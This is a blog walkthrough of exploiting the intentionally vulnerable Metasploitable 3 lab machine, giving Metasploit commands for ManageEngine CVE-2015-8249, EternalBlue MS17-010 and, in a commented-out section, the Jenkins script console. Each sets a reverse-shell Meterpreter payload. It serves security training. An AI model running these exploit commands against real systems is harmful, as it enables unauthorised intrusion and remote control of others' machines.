---
layout: single
title:  "Metasploitable 3 Walkthrough"
date:   2020-07-25 08:49:23 +0100
categories: windows
excerpt: An overview of exploiting the vulnerabilities in Metasploitable 3 
---
![metasploitable](/images/metasploitable3/msf3-1.png)

# Metasploitable 3 Exploitation Guide

## Introduction

Hello all, in this post I will be going over the ways to exploit code and gain a shell on Rapid7's [Metasploitable 3](https://github.com/rapid7/metasploitable3) machine. Each vulnerability will be split into it's own section and explained with links for reference, I will also go over ways to escalate privileges from LOCAL SERVICE shells to SYSTEM, by combining multiple exploits. Each week I will add more, so consider it a rolling post where I will update it with each new vulnerability I find and then exploit. The link to each section will as usual, be in the table of contents at the side of the page. If you have any questions feel free to reach out to me on my Twitter, or my Discord, both linked at the side. Without further ado, let's get started.

## Links and Resources 
These are just some useful links and resources if you get stuck exploiting the machine.
 - [The projects GitHub Page](https://github.com/rapid7/metasploitable3)
 - [A guide to installing Metasploitable3](https://www.youtube.com/watch?v=errn34YrEjM)
 - [Meterpreter Basics](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
 - [Attacking Metasploitable 3 - Metasploit Minute - Mubix](https://www.youtube.com/watch?v=4HOGfSQEYuE)
 - [List of Metasploitable 3 Vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities)
 - [Details of how Metasploitable 3 is configured](https://github.com/rapid7/metasploitable3/wiki/Configuration)
 - [Metasploit Download](https://github.com/rapid7/metasploit-framework)
 - [A Beginners Guide to Metasploit - HackerSploit](https://www.youtube.com/watch?v=8lR27r8Y_ik&list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm)



## NMAP Scan of Metasploitable 3

![nmap](/images/metasploitable3/nmap.png)

## Metasploit Prerequisites

To make our lives easier I will launch metasploit with the `msfdb run` command to launch msf and start the database for credential storage, I will also use the `setg` command to globally set the RHOST and LHOST to the IP of Metasploitable3 and our local IP respectively.

![msf-1](/images/metasploitable3/msf-1.png)

<!--
## Exploiting the Jenkins Vulnerability 

The first vulnerability we will be exploiting is to do with a poor Jenkins implementation, where the script editor is not locked behind a password, so it allows for unauthenticated remote code execution as LOCAL SERVICE, the module we will be using is, [exploit/multi/http/jenkins_script_console](https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console), all we need to do is load up the module and run `exploit` as we have already set the RHOST and LHOST with `setg`. We also need to make sure that we are using a 64 bit payload as Metasploitable 3 is a 64 bit machine. We can set the correct payload with, `set payload windows/x64/meterpreter/reverse_tcp`.

{% highlight powershell linenos %}
use exploit/multi/http/jenkins_script_console
set payload windows/x64/meterpreter/reverse_tcp
exploit
{% endhighlight %}

-->

## Exploiting Manage Engine - CVE-2015-8249

The first vulnerability we will be exploiting is to do with an outdated Manage Engine Desktop Central implementation, there is a CVE with a metasploit module and this allows for unauthenticated remote code execution as LOCAL SERVICE, the module we will be using is, [exploit/windows/http/manageengine_connectionid_write](https://www.rapid7.com/db/modules/exploit/windows/http/manageengine_connectionid_write), all we need to do is load up the module and run `exploit` as we have already set the RHOST and LHOST with `setg`. We also need to make sure that we are using a 64 bit payload as Metasploitable 3 is a 64 bit machine. We can set the correct payload with, `set payload windows/x64/meterpreter/reverse_tcp`.

{% highlight powershell linenos %}
use exploit/windows/http/manageengine_connectionid_write
set payload windows/x64/meterpreter/reverse_tcp
exploit
{% endhighlight %}

![bingo](/images/metasploitable3/msf-2.png)

Bingo, we got a shell as LOCAL SERVICE. 

Here is a link to an in-depth article exploiting this vulnerability - [Here](https://redteamtutorials.com/2018/10/24/metasploitable-3-exploiting-manage-engine-desktop-central-9/)


## Exploiting EternalBlue, MS17-010

The next vulnerability we will exploit is [MS17-010](https://en.wikipedia.org/wiki/EternalBlue), EternalBlue. To exploit this vulnerability, it is quite simple, all we need to do is load the module in metasploit and then run the exploit.

![](/images/metasploitable3/msf-1.png)

{% highlight powershell  %}
use exploit/windows/smb/ms17_010_eternalblue
set LHOST 10.10.11.2
set RHOST 10.10.10.11
exploit
{% endhighlight %}

![](/images/metasploitable3/eternalblue.png)

Bingo, we got a shell as system.



